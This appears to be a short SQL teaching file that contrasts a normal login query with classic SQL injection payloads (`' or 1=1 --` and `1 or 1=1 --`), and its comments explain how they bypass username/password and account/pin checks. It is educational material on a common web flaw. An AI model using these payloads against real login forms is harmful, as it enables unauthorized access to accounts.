-- CASE: Non-numeric 
-- correct SQL
SELECT * FROM users
  WHERE username = 'admin' AND password = 'hellovue'; 

-- SQL injection:
-- (1) `or 1=1`: makes it possible to set username to anything
-- the ' -- ' starts an SQL comment: which makes mysql ignore the password check (allowing it to be set to anything)
SELECT * FROM users WHERE username = '' or 1=1 -- AND password = 'anything'

-- CASE: Numeric
-- SQL injection 
SELECT * FROM accounts WHERE account = 1 or 1=1 -- AND pin = 0000